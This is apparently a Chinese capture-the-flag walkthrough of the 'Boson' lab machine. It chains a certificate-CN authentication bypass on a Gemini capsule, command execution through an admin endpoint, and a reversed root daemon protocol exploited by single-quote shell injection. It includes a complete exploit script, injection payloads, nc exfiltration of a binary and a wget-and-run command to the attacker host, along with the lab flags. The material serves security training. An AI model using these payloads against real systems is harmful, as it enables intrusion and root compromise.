> 来源：MazeSec
>
> 靶机ID：784
>
> 难度：Easy
>
> 靶机作者：Sublarge
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.154`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-26
>
> **引用与致谢**：本文的协议分析、POC 与利用思路参考了以下公开资料，特此致谢：
>
> - Gemini 协议规范：[Gemini Protocol Specification](https://geminiprotocol.net/docs/protocol-specification.gmi)
> - Go 二进制符号恢复：[debug/gosym](https://pkg.go.dev/debug/gosym)、[GoReSym](https://github.com/mandiant/GoReSym)
> - Go `os/exec` 文档：[os/exec](https://pkg.go.dev/os/exec)
> - OWASP 命令注入：[Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
> - TLS 客户端证书与 PKI：[RFC 5280](https://www.rfc-editor.org/rfc/rfc5280)、[RFC 8446](https://www.rfc-editor.org/rfc/rfc8446)

## Flag

| Flag | 值                                            | 位置                                                         |
| ---- | --------------------------------------------- | ------------------------------------------------------------ |
| user | `flag{user-a208bd27ad09fecb1f65f38bb38c186c}` | 胶囊服务账号 `boson` 的 `/home/boson/user.txt`               |
| root | `flag{root-c49a6128a277a75f1ff621400b26cdbb}` | 靶机 `Boson` 的 `/root/root.txt`，由 root 权限的 `bosond` 读取 |

## 攻击链

```text
192.168.205.154
│
├─ 80/tcp  Apache 2.4.68 + PHP 8.4.26
│    └─ 首页泄露 Gemini 胶囊地址与 /notes 入口
│
├─ 1965/tcp  Gemini 胶囊（CN=boson.lab）
│    ├─ /notes/ops 泄露 ops 客户端证书 CN：boson-admin
│    ├─ 自签名证书 CN=boson-admin → /admin 认证绕过
│    └─ /admin/run?cmd= → boson 命令执行 → user flag
│
└─ /run/boson/beam.sock（root:boson 0660）
     ├─ /usr/local/bin/bosond（root 运行的 Go 二进制）
     ├─ 逆向 BEAM 私有协议
     └─ cmd=3 CALIBRATE 单引号命令注入 → root → root flag
```

---

# 信息收集与端口探测

先确认目标在线，然后全端口扫一遍：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ping -c 2 192.168.205.154
PING 192.168.205.154 (192.168.205.154) 56(84) bytes of data.
64 bytes from 192.168.205.154: icmp_seq=1 ttl=64 time=0.805 ms
64 bytes from 192.168.205.154: icmp_seq=2 ttl=64 time=0.391 ms

--- 192.168.205.154 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -Pn -p- --min-rate 3000 -T4 192.168.205.154
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 18:14 +0800
Nmap scan report for 192.168.205.154
Host is up (0.0020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1965/tcp open  tivoli-npm
MAC Address: 08:00:27:CA:40:C2 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 9.29 seconds
```

22、80、1965 三个端口。1965 被 nmap 识别成 `tivoli-npm`，但对端口做服务识别时会返回 `59 bad request`——这是 Gemini 协议的状态码，说明 1965 上跑的是一个 Gemini 胶囊服务器，而不是普通 HTTP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -Pn -p22,80,1965 -sV -sC 192.168.205.154
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-26 18:14 +0800
Nmap scan report for 192.168.205.154
Host is up (0.00044s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 10.5 (protocol 2.0)
80/tcp   open  http            Apache httpd 2.4.68 ((Unix))
|_http-title: north hall collider \xE2\x80\x94 BOSON LAB
|_http-server-header: Apache/2.4.68 (Unix)
1965/tcp open  ssl/tivoli-npm?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|_    59 bad request
| ssl-cert: Subject: commonName=boson.lab
| Not valid before: 2026-10-17T13:19:05
|_Not valid after:  2036-10-14T13:19:05
MAC Address: 08:00:27:CA:40:C2 (Oracle VirtualBox virtual NIC)
```

80 端口是一个 Apache + PHP 站点，`X-Powered-By: PHP/8.4.26`，标题是 `north hall collider — BOSON LAB`。页面本身是静态宣传页，`/includes`、`/assets` 不带斜杠会 301 跳到同名目录，加上斜杠后才返回 403（只是禁止列目录，目录里的静态文件照常可访问），没有可以直接利用的 Web 功能。真正的入口写在首页文案里：

```text
The collider does not stop for a web dashboard. The authoritative experiment log
lives on the lab capsule — a Gemini capsule on the internal lab network, not an HTTP site.
...
CAPSULE · PUBLIC RUN LOG
gemini://192.168.205.154:1965/
...
Public notes: /notes — run log and the operations note.
Ops access to the capsule is certificate-gated and runs as the lab's
boson service account.
...
The beam controller is a separate local daemon. It never leaves the lab network and
speaks a small binary protocol on a root-owned socket; the capsule only reports.
```

首页已经给出了两条关键信息：

1. 实验日志在 `gemini://192.168.205.154:1965/`，公开笔记在 `/notes`；
2. 运维访问使用客户端证书，且以 `boson` 服务账号运行；另外还有一个 root 所有的 beam 控制 socket。

---

# Gemini 胶囊枚举

Gemini 协议很简单：客户端在 TLS 连接里发送一行 URL（以 `\r\n` 结尾），服务端返回一行状态码 + 元信息，然后返回响应体，最后关闭连接。状态码 `20` 表示成功，`51` 表示未找到，`59` 表示请求格式错误，`60` 表示需要客户端证书，`61` 表示证书未授权。

为了后续方便带客户端证书访问，先写一个小的 Gemini 客户端：

```python
#!/usr/bin/env python3
# gem.py
import socket
import ssl
import sys

HOST, PORT = "192.168.205.154", 1965

url = sys.argv[1]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# 可选：gem.py <url> <cert.pem> <key.pem>
if len(sys.argv) > 2:
    ctx.load_cert_chain(sys.argv[2], sys.argv[3])

sock = socket.create_connection((HOST, PORT), timeout=10)
tls = ctx.wrap_socket(sock, server_hostname="boson.lab")
tls.sendall((url + "\r\n").encode())

while True:
    data = tls.recv(65536)
    if not data:
        break
    sys.stdout.buffer.write(data)
```

访问根胶囊：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/
20 text/gemini
# BOSON LAB
North Hall collider — public capsule.

## RUN LOG
=> /notes Run log
=> /notes/ops Operations note

The capsule is the authoritative experiment log. Ops access is certificate-gated.
```

`/notes` 里是运行日志：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/notes
20 text/gemini
# RUN LOG
=> /notes/run-041 Run 041 — calibration baseline
=> /notes/run-042 Run 042 — detector alignment
=> /notes/ops Operations note
```

真正有用的是 `/notes/ops`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/notes/ops
20 text/gemini
# OPERATIONS

Capsule ops access uses the client certificate CN `boson-admin`.

Ops tooling issues a short-lived certificate per shift; the capsule
authenticates the subject CN on every admin request.
```

这里明确说了：运维访问只认客户端证书的 **CN=`boson-admin`**。如果服务端只比较 CN 字符串、不验证证书链，那么任意一张自签名证书都能冒充运维。

---

# 客户端证书认证绕过

先确认 `/admin` 的证书校验行为：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/admin
60 client certificate required

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/admin foo.crt foo.key
61 certificate not authorized
```

不带证书返回 `60`，带一张 `CN=foo` 的证书返回 `61`，说明服务端确实在检查 CN。接下来生成一张自签名证书，把 CN 直接设成 `boson-admin`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ openssl req -x509 -newkey rsa:2048 \
    -keyout admin.key -out admin.crt -days 365 -nodes \
    -subj "/CN=boson-admin"
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ openssl x509 -in admin.crt -noout -subject
subject=CN=boson-admin
```

用这张证书访问 `/admin`：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py gemini://192.168.205.154:1965/admin admin.crt admin.key
20 text/gemini
# CAPSULE OPS
Authenticated as CN=boson-admin.

=> /admin/run?cmd=id Run diagnostic: id
=> /admin/run?cmd=cat%20/home/boson/user.txt Read user flag

Diagnostics run as the capsule service account.
```

认证绕过成功。`/admin/run?cmd=` 是一个命令执行接口，命令由 capsule 服务账号 `boson` 执行：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=id' admin.crt admin.key
20 text/plain
uid=102(boson) gid=103(boson) groups=103(boson),103(boson)

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=cat%20/home/boson/user.txt' admin.crt admin.key
20 text/plain
flag{user-a208bd27ad09fecb1f65f38bb38c186c}
```

user flag 到手，位置是 `/home/boson/user.txt`。

顺带确认一下系统环境：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=uname%20-a' admin.crt admin.key
20 text/plain
Linux Boson 7.1.5-0-stable #1-Alpine SMP PREEMPT_DYNAMIC 2026-07-28 18:09:33 x86_64 Linux
```

目标是一台 Alpine Linux，主机名 `Boson`。

---

# 本地枚举：发现 beam 控制器

以 `boson` 身份执行 `ps`，可以看到两个守护进程：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=ps%20-ef' admin.crt admin.key
...
 2349 root     supervise-daemon boson-beam --start ... /usr/local/bin/bosond --
 2351 root     /usr/local/bin/bosond
 2377 root     supervise-daemon boson-gemini --start ... --user boson boson /usr/local/bin/boson-gemini --
 2378 boson    /usr/local/bin/boson-gemini
```

两者的启动方式不一样。`boson-gemini` 明确用 `--user boson` 降权，而 `boson-beam` 没有，直接以 root 运行。再看 init 脚本：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=cat%20/etc/init.d/boson-beam' admin.crt admin.key
#!/sbin/openrc-run

name="boson-beam"
description="BOSON LAB beam controller"

supervisor="supervise-daemon"
command="/usr/local/bin/bosond"
pidfile="/run/boson-beam.pid"
output_log="/var/log/boson/beam.log"
error_log="/var/log/boson/beam.log"
respawn_delay=5
respawn_max=0

depend() {
    need net
}

start_pre() {
    mkdir -p /run/boson
    chown root:boson /run/boson
    chmod 0750 /run/boson
}
```

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=cat%20/etc/init.d/boson-gemini' admin.crt admin.key
#!/sbin/openrc-run

name="boson-gemini"
description="BOSON LAB Gemini capsule"

supervisor="supervise-daemon"
command="/usr/local/bin/boson-gemini"
command_user="boson:boson"
...
```

`socket` 的权限是 `root:boson 0660`，所以 `boson` 可以连上去，但服务端进程本身是 root：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=ls%20-l%20/run/boson/%20/usr/local/bin/' admin.crt admin.key
/run/boson/:
total 0
srw-rw----    1 root     boson            0 Nov 26 18:14 beam.sock

/usr/local/bin/:
-rwxr-xr-x    1 root     root           166 Oct 17 21:24 beam-ctl
-rwxr-xr-x    1 root     root       5329056 Oct 17 21:24 boson-gemini
-rwxr-xr-x    1 root     root       2445472 Oct 17 21:24 bosond
```

`beam-ctl` 只是一个壳脚本：

```bash
#!/bin/sh
# Beam controller calibration helper.
case "$1" in
    calibrate) echo "calibration target: $2" ;;
    *) echo "usage: beam-ctl calibrate <target>" ;;
esac
```

也就是说，真正的逻辑在 `bosond` 里，而且它是以 root 身份运行的。只要能从 `boson` 连上 `beam.sock` 并让它执行命令，就能提权到 root。

---

# 逆向 bosond：还原 BEAM 私有协议

先把二进制取回本地分析：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 9001 > bosond
listening on [any] 9001 ...

# 靶机上执行
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=nc%20192.168.205.128%209001%20%3C%20/usr/local/bin/bosond' admin.crt admin.key
20 text/plain
```

取回后确认文件类型：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ file bosond
bosond: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
Go BuildID=CHo7JY5J1ibZ7iEe-fil/gZ-JtZUEzs3ePjqa02GB/...,
BuildID[sha1]=8970fb4cc0eb067664021d42e48efe5502a4e888, stripped
```

Go 静态二进制，已经被 strip。先用 `strings` 找线索，能直接看到几个关键字符串和函数名：

```text
/usr/local/bin/beam-ctl calibrate '%s'
BEAM ONLINE
PONG
bad frame
bad checksum
unknown command
main.handle
main.respond
main.main
main.xorChecksum
os/exec.Command
os/user.LookupGroup
os.Chown
```

`/usr/local/bin/beam-ctl calibrate '%s'` 这个格式化字符串非常可疑：如果它最终被拼进 `/bin/sh -c`，那么只要 payload 里带一个单引号就能闭合引号并注入命令。

因为二进制被 strip，`go tool objdump -s '^main\.' bosond` 会报 `no symbol section`。不过 Go 的 `.gopclntab` 还在，可以用 `debug/gosym` 恢复函数地址：

```go
// gosym.go
package main

import (
    "debug/elf"
    "debug/gosym"
    "fmt"
    "os"
)

func main() {
    f, _ := elf.Open(os.Args[1])
    defer f.Close()

    pcln, _ := f.Section(".gopclntab").Data()
    text := f.Section(".text")
    lt := gosym.NewLineTable(pcln, text.Addr)
    tab, err := gosym.NewTable(nil, lt)
    if err != nil {
        panic(err)
    }

    for _, fn := range tab.Funcs {
        fmt.Printf("%x %x %s\n", fn.Entry, fn.End, fn.Name)
    }
}
```

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ go run gosym.go bosond | grep ' main\.'
5029c0 502bc0 main.respond
502bc0 5031a0 main.handle
5031a0 5035c0 main.main
5035c0 503600 main.handle.deferwrap1
503600 503640 main.main.gowrap1
```

然后按地址反汇编：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ objdump -d --start-address=0x5029c0 --stop-address=0x5035c0 -M intel bosond
```

关键片段（`main.respond` 构造响应）：

```asm
502a18:  mov DWORD PTR [rax],0x4d414542   ; "BEAM"
502a3f:  mov BYTE PTR [rax+0x4],0x1       ; version = 1
502a4b:  mov BYTE PTR [rax+0x5],dl        ; status
502a56:  rol bx,0x8                       ; uint16 转大端
502a86:  mov WORD PTR [rax+0x6],dx        ; length
...
502b43:  mov BYTE PTR [rcx+rbx*1-0x1],r9b ; XOR 校验和
```

`main.handle` 解析请求：

```asm
502c96:  cmp DWORD PTR [r9],0x4d414542    ; magic "BEAM"
502ca6:  movzx edx,BYTE PTR [r9+0x5]      ; command
502cac:  cmp BYTE PTR [r9+0x4],0x1        ; version == 1
502cb3:  movzx r10d,WORD PTR [r9+0x7]     ; length
502cb8:  rol r10w,0x8                     ; 大端转小端
502cc0:  cmp r10w,0x400                   ; 最大 1024
```

结合反汇编和动态测试，可以还原出完整的协议。

## 请求格式

```text
偏移   长度   含义
0      4      magic = "BEAM"
4      1      version = 0x01
5      1      command
6      1      reserved = 0x00
7      2      payload length，大端 uint16（最大 0x400）
9      n      payload
9+n    1      checksum = XOR(version, command, reserved, len_hi, len_lo, payload)
```

## 响应格式

```text
偏移   长度   含义
0      4      magic = "BEAM"
4      1      version = 0x01
5      1      status：0x00 成功，0x01 失败
6      2      payload length，大端 uint16
8      n      payload
8+n    1      checksum = XOR(version, status, len_hi, len_lo, payload)
```

## 命令表

| command | 名称      | 行为                                                         | 成功响应                      |
| ------- | --------- | ------------------------------------------------------------ | ----------------------------- |
| `0x01`  | PING      | 无                                                           | `PONG`                        |
| `0x02`  | STATUS    | 无                                                           | `BEAM ONLINE`                 |
| `0x03`  | CALIBRATE | `/bin/sh -c "/usr/local/bin/beam-ctl calibrate '<payload>'"` | 命令的合并输出                |
| 其他    | —         | —                                                            | `unknown command`（status=1） |

## 异常响应

`respond` 的失败分支统一返回 status=1，但触发条件各不相同：

| 情况                   | 服务端行为                    |
| ---------------------- | ----------------------------- |
| magic 不是 `BEAM`      | 直接关闭连接，不返回任何数据  |
| version ≠ 0x01         | `bad frame`（status=1）       |
| payload length > 0x400 | `bad frame`（status=1）       |
| 校验和不匹配           | `bad checksum`（status=1）    |
| 未知 command           | `unknown command`（status=1） |

有两点容易踩：`bad frame` 只在 version 或长度不合法时出现，magic 错时服务端是静默断开；而服务端校验完 9 字节头部就决定拒绝，此时帧尾的校验字节还没被读走，进程直接 `close` 会让内核回 RST，客户端往往只看到 `Connection reset by peer` 而拿不到响应体——调试时只发 9 字节头部再 `shutdown(SHUT_WR)`，才能看到 `bad frame`。另外，`/admin/run` 缺少 `cmd` 参数时，胶囊在 Gemini 层就返回 `59 missing cmd`，根本不会走到 BEAM。

这里有一个小坑：最初只对 payload 做 XOR，`PING` 能通，但 `STATUS` 会返回 `bad checksum`。原因是校验和实际覆盖了 `version + command + reserved + length + payload` 整段，而不是只覆盖 payload。把 header 也纳入计算后就正常了。

本地可以先把 `/run/boson` patch 成 `/tmp/boson`，再用 user namespace 补一个 `boson` 组来复现：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cp bosond bosond2
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 - <<'PY'
d = open('bosond2', 'rb').read()
open('bosond2', 'wb').write(d.replace(b'/run/boson', b'/tmp/boson'))
PY
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ unshare -r -m bash -c '
    cp /etc/group /tmp/group.new
    echo "boson:x:103:" >> /tmp/group.new
    mount --bind /tmp/group.new /etc/group
    exec ./bosond2'
2026/11/26 18:19:26 chown socket: chown /tmp/boson/beam.sock: invalid argument
2026/11/26 18:19:26 bosond listening on /tmp/boson/beam.sock
```

这里的 `chown socket` 报错是因为 user namespace 里没有映射 gid 103，`os.Chown` 拿不到合法的 gid，于是失败并且打了一行日志；socket 本身已经建好并在监听，本地调协议不受影响。

---

# 命令注入：从 boson 到 root

`CMD_CALIBRATE` 的处理逻辑等价于：

```go
cmd := fmt.Sprintf("/usr/local/bin/beam-ctl calibrate '%s'", string(payload))
out, _ := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
respond(conn, 0, out)
```

payload 被放在单引号里，但服务端没有转义单引号。构造：

```text
x';cat /root/root.txt;#
```

最终 shell 命令变成：

```bash
/bin/sh -c "/usr/local/bin/beam-ctl calibrate 'x';cat /root/root.txt;#'"
```

前一个单引号闭合 `calibrate` 的参数，`;` 开始新命令，`#` 注释掉剩余的引号。

完整的利用脚本：

```python
#!/usr/bin/env python3
# beam_exploit.py
import socket
import struct
import sys

SOCK = "/run/boson/beam.sock"
payload = sys.argv[1] if len(sys.argv) > 1 else "x';cat /root/root.txt;#"
p = payload.encode()

# 请求头：version, command=CALIBRATE, reserved, length
hdr = b"\x01\x03\x00" + struct.pack(">H", len(p))
checksum = 0
for b in hdr + p:
    checksum ^= b

frame = b"BEAM" + hdr + p + bytes([checksum])

s = socket.socket(socket.AF_UNIX)
s.settimeout(10)
s.connect(SOCK)
s.sendall(frame)

data = b""
while True:
    chunk = s.recv(65536)
    if not chunk:
        break
    data += chunk
    if len(data) >= 8:
        length = struct.unpack(">H", data[6:8])[0]
        if len(data) >= 8 + length + 1:
            break

if len(data) < 9:
    sys.exit("no response from bosond")

length = struct.unpack(">H", data[6:8])[0]
body = data[8:8 + length]

# 响应校验和：XOR(version, status, len_hi, len_lo, payload)
expect = 0
for b in data[4:8] + body:
    expect ^= b
if data[8 + length] != expect:
    print("warning: response checksum mismatch", file=sys.stderr)

sys.stdout.write(body.decode(errors="replace"))
```

把脚本上传到靶机后，以 `boson` 身份运行：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=wget%20-qO%20/tmp/beam_exploit.py%20http://192.168.205.128:8000/beam_exploit.py%20%26%26%20python3%20/tmp/beam_exploit.py' admin.crt admin.key
20 text/plain
calibration target: x
flag{root-c49a6128a277a75f1ff621400b26cdbb}
```

再执行一次 `id` 和 `hostname` 确认权限：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 gem.py 'gemini://192.168.205.154:1965/admin/run?cmd=python3%20/tmp/beam_exploit.py%20%22x%27%3Bid%3Bhostname%3Bls%20-l%20/root/root.txt%3Bcat%20/root/root.txt%3B%23%22' admin.crt admin.key
20 text/plain
calibration target: x
uid=0(root) gid=0(root)
Boson
-rw-------    1 root     root            44 Oct 17 21:19 /root/root.txt
flag{root-c49a6128a277a75f1ff621400b26cdbb}
```

root flag 到手，位置是 `/root/root.txt`。